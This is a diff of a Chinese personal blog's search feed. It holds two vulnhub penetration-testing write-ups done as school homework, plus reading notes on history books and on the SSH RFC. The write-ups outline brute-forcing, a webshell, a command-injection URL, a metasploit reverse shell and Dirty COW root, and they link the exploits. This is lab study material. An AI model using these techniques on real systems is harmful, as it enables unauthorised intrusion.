src="/2023/12/03/old/tommyboy-writeup/26%E4%B8%8B%E8%BD%BDreadme.png"><br><img src="/2023/12/03/old/tommyboy-writeup/29%E5%BE%97%E5%88%B0%E6%96%B0%E7%9B%AE%E5%BD%95.png"><br>发现8008网站的目录，根据提示修改UA，并爆破网页名<br><img src="/2023/12/03/old/tommyboy-writeup/31%E8%AE%BF%E9%97%AE%E5%88%B0%E7%9B%AE%E5%BD%95.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/32%E6%9B%B4%E6%94%B9useragent%E6%88%90%E5%8A%9F%E8%AE%BF%E9%97%AE.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/33%E7%BD%91%E7%AB%99%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B41.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/34%E7%BD%91%E7%BB%9C%E6%96%87%E4%BB%B6%E7%88%86%E7%A0%B42.png"><br>得到flag3和hint<br><img src="/2023/12/03/old/tommyboy-writeup/35flag3+hint.png"><br>爆破backups密码<br><img src="/2023/12/03/old/tommyboy-writeup/36%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/37tommyboy%E4%B8%8A%E7%BA%BF%E6%97%B6%E9%97%B4.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/38%E7%94%9F%E6%88%90%E5%AF%86%E7%A0%81.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/39%E7%88%86%E7%A0%B4%E6%88%90%E5%8A%9F.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/41%E8%A7%A3%E5%8E%8B.png"><br>得到提示<br><img src="/2023/12/03/old/tommyboy-writeup/42%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>wpscan扫描爆破网站后台<br><img src="/2023/12/03/old/tommyboy-writeup/43%E9%80%9A%E8%BF%87wpscan%E8%8E%B7%E5%8F%96%E7%94%A8%E6%88%B7%E5%90%8D.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/44%E7%88%86%E7%A0%B4%E5%87%BA%E5%AF%86%E7%A0%81.png"><br>登陆后台查看draft<br><img src="/2023/12/03/old/tommyboy-writeup/45%E7%99%BB%E9%99%86%E5%90%8E%E5%8F%B0.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/46%E8%8E%B7%E5%BE%97%E5%AF%86%E7%A0%81%E6%8F%90%E7%A4%BA.png"><br>根据hint和draft提示，ssh连接靶机<br><img src="/2023/12/03/old/tommyboy-writeup/47ssh%E7%99%BB%E9%99%86.png"><br>查看flag4<br><img src="/2023/12/03/old/tommyboy-writeup/48flag4+%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC.png"><br>找到flag5<br><img src="/2023/12/03/old/tommyboy-writeup/49%E5%8F%91%E7%8E%B0flag5.png"><br>写webshell，获得www-data权限<br><img src="/2023/12/03/old/tommyboy-writeup/50%E5%88%B6%E4%BD%9Cwebshell.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/51%E9%80%9A%E8%BF%87webshell%E8%AF%BB%E5%8F%96flag5.png"><br>提权<br><img src="/2023/12/03/old/tommyboy-writeup/52%E9%80%9A%E8%BF%87linspea%E8%84%9A%E6%9C%AC%E6%8E%A2%E6%B5%8B%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/53%E8%8E%B7%E5%8F%9640616.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/54%E6%8F%90%E6%9D%83.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/55theend.png"><br>flag2和3<br><img src="/2023/12/03/old/tommyboy-writeup/flag2.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/flag3.png"></p><p><img src="/2023/12/03/old/tommyboy-writeup/%E6%8F%90%E7%A4%BA%E6%96%87%E6%9C%AC%E6%B1%87%E6%80%BB.txt"></p><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol><li>dirbuster以前没用过，不过图形化什么的确实挺方便</li><li>linpeas这个脚本，功能十分强大</li><li>脑洞不够，鬼知道stevejobs要改iphone，不过我想，可以讲所有苹果产品的UA搜集起来做成字典，用burpsuite爆破</li><li>这个靶机，getroot是非必要的</li><li>脏牛提权后不久，靶机就会死机，不知道其他提权方法会不会这样</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>学校给的ppt<br><a href="https://www.cnblogs.com/cute/p/16331359.html">https://www.cnblogs.com/cute/p/16331359.html</a> linpeas脚本介绍<br><a href="https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS">https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS</a> linpeas github库<br><a href="https://www.exploit-db.com/exploits/40616">https://www.exploit-db.com/exploits/40616</a> 脏牛提权exp脚本</p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
+          
+          <category> 网络安全 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>wallabysnightmare102-writeup</title>
-    <url>/2023/11/24/old/wallabysnightmare102-writeup/</url>
-    <content><![CDATA[<h1 id="wallabysnightmare102-writeup"><a href="#wallabysnightmare102-writeup" class="headerlink" title="wallabysnightmare102_writeup"></a>wallabysnightmare102_writeup</h1><p>这是学校作业</p>
-<span id="more"></span>
-<h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote>
-<p>靶机名：wallabysnightmare102<br>靶机链接：<a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a><br>作者博客：<a href="https://www.arashparsa.com/">https://www.arashparsa.com/</a></p>
-</blockquote>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol>
-<li>80端口web服务</li>
-<li>使用nikto扫描漏洞后会关闭80端口，并吧网站转移到60080端口</li>
-</ol>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol>
-<li>发现page参数具有目录穿越漏洞</li>
-<li>nikto扫描该参数</li>
-<li>80端口关闭，继续扫描60080端口的page参数</li>
-<li>发现了&#x2F;?page&#x3D;mailer网页注释</li>
-<li>发现&#x2F;?page&#x3D;mailer&amp;mail&#x3D;ls命令执行漏洞</li>
-<li>通过metasploit获取php reverse shell</li>
-</ol>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
-<li>根据内核版本，上传脏牛提权漏洞 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></li>
-<li>getroot</li>
-</ol>
-<h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote>
-<p>[[nikto]] web 漏洞扫描工具<br>metasploit 获取反弹shell用<br><code>python3 -m http.server 8081</code> 开启简易web网站，用于上传提权脚本</p>
-</blockquote>
-<h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><ol>
-<li>端口扫描<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/1.png"></li>
-<li>浏览网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/2.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/3.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/4.png"></li>
-<li>发现目录穿越漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/5.png"></li>
-<li>通过nikto进行漏洞扫描，但是扫到一半超时了<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/6.png"></li>
-<li>发现开启了新端口<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/7.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/8.png"></li>
-<li>访问网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/9.png"></li>
-<li>发现网站仍然有page参数<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/10.png"></li>
-<li>遍历page参数值<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/11.png"></li>
-<li>发现mailer有命令执行漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/12.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/13.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/14.png"></li>
-<li>远程连接<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/15.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/16.png"></li>
-<li>上传提权脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/17.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/18.png"></li>
-<li>编译脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/19.png"></li>
-<li>getshell<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/20.png"></li>
-</ol>
-<h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol>
-<li>要善于使用工具，发挥工具的最大功用；当然，弄清楚原理、学的深入是最重要的</li>
-<li>metasploit是一个功能强大的软件，这意味着要学习如何使用也是很花时间的，这也是确实是未来需要花的</li>
-</ol>
-<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote>
-<p>学校给的资料<br>提权脚本 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></p>
-</blockquote>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>wallabysnightmare102-writeup</title>
+      <link href="/2023/11/24/old/wallabysnightmare102-writeup/"/>
+      <url>/2023/11/24/old/wallabysnightmare102-writeup/</url>
+      
+        <content type="html"><![CDATA[<h1 id="wallabysnightmare102-writeup"><a href="#wallabysnightmare102-writeup" class="headerlink" title="wallabysnightmare102_writeup"></a>wallabysnightmare102_writeup</h1><p>这是学校作业</p><span id="more"></span><h1 id="靶机简介"><a href="#靶机简介" class="headerlink" title="靶机简介"></a>靶机简介</h1><blockquote><p>靶机名：wallabysnightmare102<br>靶机链接：<a href="https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/">https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/</a><br>作者博客：<a href="https://www.arashparsa.com/">https://www.arashparsa.com/</a></p></blockquote><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><ol><li>80端口web服务</li><li>使用nikto扫描漏洞后会关闭80端口，并吧网站转移到60080端口</li></ol><h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><ol><li>发现page参数具有目录穿越漏洞</li><li>nikto扫描该参数</li><li>80端口关闭，继续扫描60080端口的page参数</li><li>发现了&#x2F;?page&#x3D;mailer网页注释</li><li>发现&#x2F;?page&#x3D;mailer&amp;mail&#x3D;ls命令执行漏洞</li><li>通过metasploit获取php reverse shell</li></ol><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol><li>根据内核版本，上传脏牛提权漏洞 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></li><li>getroot</li></ol><h1 id="工具和技术"><a href="#工具和技术" class="headerlink" title="工具和技术"></a>工具和技术</h1><blockquote><p>[[nikto]] web 漏洞扫描工具<br>metasploit 获取反弹shell用<br><code>python3 -m http.server 8081</code> 开启简易web网站，用于上传提权脚本</p></blockquote><h1 id="渗透过程及结果"><a href="#渗透过程及结果" class="headerlink" title="渗透过程及结果"></a>渗透过程及结果</h1><ol><li>端口扫描<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/1.png"></li><li>浏览网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/2.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/3.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/4.png"></li><li>发现目录穿越漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/5.png"></li><li>通过nikto进行漏洞扫描，但是扫到一半超时了<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/6.png"></li><li>发现开启了新端口<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/7.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/8.png"></li><li>访问网站<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/9.png"></li><li>发现网站仍然有page参数<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/10.png"></li><li>遍历page参数值<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/11.png"></li><li>发现mailer有命令执行漏洞<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/12.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/13.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/14.png"></li><li>远程连接<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/15.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/16.png"></li><li>上传提权脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/17.png"><br><img src="/2023/11/24/old/wallabysnightmare102-writeup/18.png"></li><li>编译脚本<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/19.png"></li><li>getshell<br><img src="/2023/11/24/old/wallabysnightmare102-writeup/20.png"></li></ol><h1 id="总结反思"><a href="#总结反思" class="headerlink" title="总结反思"></a>总结反思</h1><ol><li>要善于使用工具，发挥工具的最大功用；当然，弄清楚原理、学的深入是最重要的</li><li>metasploit是一个功能强大的软件，这意味着要学习如何使用也是很花时间的，这也是确实是未来需要花的</li></ol><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><blockquote><p>学校给的资料<br>提权脚本 <a href="https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c">https://gist.githubusercontent.com/rverton/e9d4ff65d703a9084e85fa9df083c679/raw/9b1b5053e72a58b40b28d6799cf7979c53480715/cowroot.c</a></p></blockquote>]]></content>
+      
+      
       <categories>
-        <category>网络安全</category>
+          
+          <category> 网络安全 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-        <tag>writeup</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>读书笔记《血酬定律——中国历史中的生存游戏》</title>
-    <url>/2023/11/23/old/readingnote002/</url>
-    <content><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p>
-<span id="more"></span>
-
-<h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol>
-<li>血酬<ol>
-<li>对暴力的酬劳</li>
-<li>价值取决于争拼对象</li>
-<li>为了什么，可以冒多大的风险</li>
-<li>最大化追求假设</li>
-</ol>
-</li>
-<li>血酬推想<ol>
-<li>为了追求血酬的长期最大化，土匪愿意建立保护掠夺对象的秩序。</li>
-<li>法酬——法酬&#x3D;全部税费-公共产品价值</li>
-<li>为了追求短期血酬收入的最大化，合法的暴力集团也可以退化为土匪</li>
-<li>随着血酬逐步降低，生产行为的报酬相对提高，土匪可以转化为农民</li>
-<li>假定血酬不变，随着生产收益的减少以至消失，大量生产者将转入暴力集团</li>
-<li>当某种秩序带来的收益超过旧秩序时，立法者和执法者也应该愿意变法，提高或降低对掠夺对象的保护程度</li>
-</ol>
-</li>
-<li>命价<ol>
-<li>官价</li>
-<li>血价</li>
-</ol>
-</li>
-<li>官话和非官话的转换</li>
-<li>抽水机<ol>
-<li>等水</li>
-<li>抽水</li>
-<li>水来自于暴力差距</li>
-</ol>
-</li>
-<li>灰帮<ol>
-<li>口大口小，形势比人强</li>
-</ol>
-</li>
-<li>灰牢</li>
-<li>英雄到替罪羊的转变</li>
-<li>硬伙企业<ol>
-<li>合作人都是请来的老虎</li>
-</ol>
-</li>
-<li>地头蛇——半封建半帝国</li>
-<li>白员<ol>
-<li>对潜规则的揭发为威胁夺食</li>
-<li>高级的潜规则——自我反对</li>
-</ol>
-</li>
-</ol>
-<h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><ol>
-<li>天下已定，英雄当烹</li>
-</ol>
-<h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>跟潜规则一书差不多，只是挖掘的更具象</p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+            <tag> writeup </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>读书笔记《血酬定律——中国历史中的生存游戏》</title>
+      <link href="/2023/11/23/old/readingnote002/"/>
+      <url>/2023/11/23/old/readingnote002/</url>
+      
+        <content type="html"><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p><span id="more"></span><h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol><li>血酬<ol><li>对暴力的酬劳</li><li>价值取决于争拼对象</li><li>为了什么，可以冒多大的风险</li><li>最大化追求假设</li></ol></li><li>血酬推想<ol><li>为了追求血酬的长期最大化，土匪愿意建立保护掠夺对象的秩序。</li><li>法酬——法酬&#x3D;全部税费-公共产品价值</li><li>为了追求短期血酬收入的最大化，合法的暴力集团也可以退化为土匪</li><li>随着血酬逐步降低，生产行为的报酬相对提高，土匪可以转化为农民</li><li>假定血酬不变，随着生产收益的减少以至消失，大量生产者将转入暴力集团</li><li>当某种秩序带来的收益超过旧秩序时，立法者和执法者也应该愿意变法，提高或降低对掠夺对象的保护程度</li></ol></li><li>命价<ol><li>官价</li><li>血价</li></ol></li><li>官话和非官话的转换</li><li>抽水机<ol><li>等水</li><li>抽水</li><li>水来自于暴力差距</li></ol></li><li>灰帮<ol><li>口大口小，形势比人强</li></ol></li><li>灰牢</li><li>英雄到替罪羊的转变</li><li>硬伙企业<ol><li>合作人都是请来的老虎</li></ol></li><li>地头蛇——半封建半帝国</li><li>白员<ol><li>对潜规则的揭发为威胁夺食</li><li>高级的潜规则——自我反对</li></ol></li></ol><h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><ol><li>天下已定，英雄当烹</li></ol><h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>跟潜规则一书差不多，只是挖掘的更具象</p>]]></content>
+      
+      
       <categories>
-        <category>读书笔记</category>
+          
+          <category> 读书笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>读书笔记《潜规则——中国历史中的真实游戏》</title>
-    <url>/2023/11/23/old/readingnote001/</url>
-    <content><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p>
-<span id="more"></span>
-
-<h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol>
-<li>合法伤害权——因而杀心自起，以此讹人夺利</li>
-<li>民不和官斗<ol>
-<li>民斗官，对于民成本竟大于收益，对于官却牵扯到万万人的孝敬。斗争意志比不上</li>
-<li>官手段多，民的手段少(钱、知识、关系网、组织)</li>
-<li>民是散沙，需要出头鸟，但出头就要被打，因为太出头就被皇上听见了</li>
-</ol>
-</li>
-<li>公平等级<ol>
-<li>第一级——真实公平</li>
-<li>第二级——民的心里预期</li>
-<li>第三级——不公平</li>
-</ol>
-</li>
-<li>清官淘汰<ol>
-<li>恶政不需要清官</li>
-<li>不做清官的成本低，收益高</li>
-<li>互相勾结效率更高，清官被恶棍排挤</li>
-</ol>
-</li>
-<li>皇帝龙虾<ol>
-<li>信息茧房</li>
-</ol>
-</li>
-<li>潜规则<ol>
-<li>基于主体造福&#x2F;伤害能力形成的，与光明规则偏离冲突的规则，这是私下里的魔鬼契约</li>
-<li>违规者遭受报复</li>
-<li>主要内容是利益再分配，但在基础部分是收割</li>
-<li>新官堕落定律——<ol>
-<li>晏氏转型——离皇帝越远，贪的成本越低，不贪的风险越高，皇帝越容易被蛊惑</li>
-</ol>
-</li>
-<li>正义边界漂移</li>
-<li>帝国死弯<ol>
-<li>征税越多、聚集起来的暴力越多，但产生的叛乱越多，聚集起来的暴力抵不过叛乱自发生产的暴力，帝国就死了</li>
-<li>谷底有硬石，是叛乱的领袖力量</li>
-</ol>
-</li>
-</ol>
-</li>
-</ol>
-<h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><blockquote>
-<p>身怀利器，杀心自起<br>百姓如果变成刺猬，我们不久变成清官了吗<br>恶政是一面筛子，淘汰清官，选择恶棍<br>第一次教育教了官员们满口仁义道德，第二次教育教了他们一肚子男娼女盗</p>
-</blockquote>
-<h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>潜规则和合法伤害权<br>关系</p>
-<ul>
-<li>皇帝与官</li>
-<li>官与民</li>
-<li>皇帝与民</li>
-</ul>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> 🌟 </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>读书笔记《潜规则——中国历史中的真实游戏》</title>
+      <link href="/2023/11/23/old/readingnote001/"/>
+      <url>/2023/11/23/old/readingnote001/</url>
+      
+        <content type="html"><![CDATA[<p>在整理笔记库的时候发现的，尽管内容浅薄，但是存着吃灰也可惜，就发了</p><span id="more"></span><h1 id="纲要线索"><a href="#纲要线索" class="headerlink" title="纲要线索"></a>纲要线索</h1><ol><li>合法伤害权——因而杀心自起，以此讹人夺利</li><li>民不和官斗<ol><li>民斗官，对于民成本竟大于收益，对于官却牵扯到万万人的孝敬。斗争意志比不上</li><li>官手段多，民的手段少(钱、知识、关系网、组织)</li><li>民是散沙，需要出头鸟，但出头就要被打，因为太出头就被皇上听见了</li></ol></li><li>公平等级<ol><li>第一级——真实公平</li><li>第二级——民的心里预期</li><li>第三级——不公平</li></ol></li><li>清官淘汰<ol><li>恶政不需要清官</li><li>不做清官的成本低，收益高</li><li>互相勾结效率更高，清官被恶棍排挤</li></ol></li><li>皇帝龙虾<ol><li>信息茧房</li></ol></li><li>潜规则<ol><li>基于主体造福&#x2F;伤害能力形成的，与光明规则偏离冲突的规则，这是私下里的魔鬼契约</li><li>违规者遭受报复</li><li>主要内容是利益再分配，但在基础部分是收割</li><li>新官堕落定律——<ol><li>晏氏转型——离皇帝越远，贪的成本越低，不贪的风险越高，皇帝越容易被蛊惑</li></ol></li><li>正义边界漂移</li><li>帝国死弯<ol><li>征税越多、聚集起来的暴力越多，但产生的叛乱越多，聚集起来的暴力抵不过叛乱自发生产的暴力，帝国就死了</li><li>谷底有硬石，是叛乱的领袖力量</li></ol></li></ol></li></ol><h1 id="振聋发聩"><a href="#振聋发聩" class="headerlink" title="振聋发聩"></a>振聋发聩</h1><blockquote><p>身怀利器，杀心自起<br>百姓如果变成刺猬，我们不久变成清官了吗<br>恶政是一面筛子，淘汰清官，选择恶棍<br>第一次教育教了官员们满口仁义道德，第二次教育教了他们一肚子男娼女盗</p></blockquote><h1 id="总结感想"><a href="#总结感想" class="headerlink" title="总结感想"></a>总结感想</h1><p>潜规则和合法伤害权<br>关系</p><ul><li>皇帝与官</li><li>官与民</li><li>皇帝与民</li></ul>]]></content>
+      
+      
       <categories>
-        <category>读书笔记</category>
+          
+          <category> 读书笔记 </category>
+          
       </categories>
-      <tags>
-        <tag>🌟</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>RFC4251阅后总结</title>
-    <url>/2023/11/11/old/RFC4251%E9%98%85%E5%90%8E%E6%80%BB%E7%BB%93/</url>
-    <content><![CDATA[<p>ps: 线索里的tab键都被吞了，正在处理中</p>
-<hr>
-<h1 id="来源"><a href="#来源" class="headerlink" title="来源"></a>来源</h1><p>来源 <a href="https://datatracker.ietf.org/">https://datatracker.ietf.org</a></p>
-<ul>
-<li>IETF Internet Engineering Task Force</li>
-<li>RFC Request for Comment</li>
-</ul>
-<h1 id="线索"><a href="#线索" class="headerlink" title="线索"></a>线索</h1><span id="more"></span>
-
-<ul>
-<li><p>设计架构</p>
-<ul>
-<li><p>主机key</p>
-<ul>
-<li>两个信任模型<ul>
-<li>有CA</li>
-<li>无CA</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>可拓展性	</p>
-<ul>
-<li>方法标识符<ul>
-<li>算法</li>
-<li>认证方式</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>策略问题</p>
-<ul>
-<li>加密</li>
-<li>完整性</li>
-<li>压缩</li>
-<li>密钥交换</li>
-<li>公钥算法和格式</li>
-<li>身份认证方式</li>
-<li>The operations that the user is allowed to perform using the<br>connection protocol</li>
-</ul>
-</li>
-<li><p>安全特性<br>- 协商 negotiation</p>
-</li>
-<li><p>本地化和字符集问题</p>
-</li>
-<li><p>数据类型</p>
-<ul>
-<li>比特 byte</li>
-<li>布尔 boolean</li>
-<li>32位无符号整型 uint32</li>
-<li>64位无符号整型 uint64</li>
-<li>字符串 string</li>
-<li>多精度整型 mpint</li>
-<li>列表 name-list</li>
-</ul>
-</li>
-<li><p>算法和方式命名 algorithm and method naming</p>
-<ul>
-<li>implementation自带了一些算法和方式，但是可以自己加</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>消息数字标识 Number Message</p>
-<ul>
-<li>传输层协议</li>
-<li>身份认证协议</li>
-<li>连接层协议</li>
-<li>反弹客户端协议 Reversed for client protocol</li>
-<li>本地拓展</li>
-</ul>
-</li>
-<li><p>IANA因素 IANA Consideration </p>
-<ul>
-<li>Internet Assigned Numbers Authority<ul>
-<li><a href="https://www.iana.org/">https://www.iana.org/</a></li>
-<li>The global coordination of the DNS Root, IP addressing, and other Internet protocol resources is performed as the Internet Assigned Numbers Authority (IANA) functions.</li>
-<li>在协议中，其职能是分配协议的名称或专业术语(?)、注册协议(?)</li>
-</ul>
-</li>
-<li>RFC4250——IANA专业术语定义文档</li>
-</ul>
-</li>
-<li><p>协议层次</p>
-<ul>
-<li>传输层协议<ul>
-<li>对服务端的身份认证</li>
-<li>session id (给上层协议使用)</li>
-</ul>
-</li>
-<li>身份认证协议<ul>
-<li>密码认证</li>
-<li>密钥认证</li>
-<li>基于主机的认证</li>
-</ul>
-</li>
-<li>连接协议<ul>
-<li>多路复用</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>安全考虑</p>
-<ul>
-<li>伪随机数生成</li>
-<li>控制字符过滤</li>
-<li>传输<ul>
-<li>保密性</li>
-<li>完整性</li>
-<li>replay——确保数据在不同会话间的隔离，防止replay先前会话的数据</li>
-<li>中间人攻击——三种情形</li>
-<li>DOS Denial of Service</li>
-<li>Convert Channals 转换频道？</li>
-<li>前向加密 forward secrecy FS  或完美前向加密 perfect forward secrecy PFS <ul>
-<li>确保即使私钥被泄漏或破解，过去的通信数据依旧不能被解密。一般方法是在非对称加密之前，用仅在通信会话期间有效，并且不会存储在长期存储介质中的临时密钥来加密</li>
-<li>Diffie-Hellman key exchange</li>
-<li>compromise</li>
-</ul>
-</li>
-<li>密钥交换方式提供<ul>
-<li>好像不是安全考虑</li>
-</ul>
-</li>
-<li>流量分析</li>
-</ul>
-</li>
-<li>身份认证<ul>
-<li>弱传输</li>
-<li>调试信息 debug message<ul>
-<li>可能暴露主机信息</li>
-</ul>
-</li>
-<li>公钥认证<ul>
-<li>前提：客户端是没有被渗透，私钥没有被拿到</li>
-<li>需要密码来加密私钥</li>
-<li>smartcards</li>
-</ul>
-</li>
-<li>密码认证<ul>
-<li>前提：服务器是真的</li>
-<li>不然会暴露用户名和密码</li>
-</ul>
-</li>
-<li>基于主机的认证<ul>
-<li>前提：客户端没有被渗透</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>连接<ul>
-<li>端点安全？End Point Security<ul>
-<li>如果服务端被入侵了，终端会话、端口转发、系统访问都被入侵</li>
-<li>如果客户端被入侵了，并且攻击者没被身份认证协议组织，其暴露的服务都容易收到攻击</li>
-</ul>
-</li>
-<li>端口转发？</li>
-<li>X11转发？</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p>奇怪的单词<br>    - compromise google翻译上的英语释义是妥协，但是文档中的意思好像是妥协(?)</p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>阐述了ssh的设计理念、总体架构和安全考虑，以及延伸了某些技术细节，介绍了更进一步学习的路径</p>
-<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><ol>
-<li>什么是CA<ol>
-<li>CA认证的工作原理是什么</li>
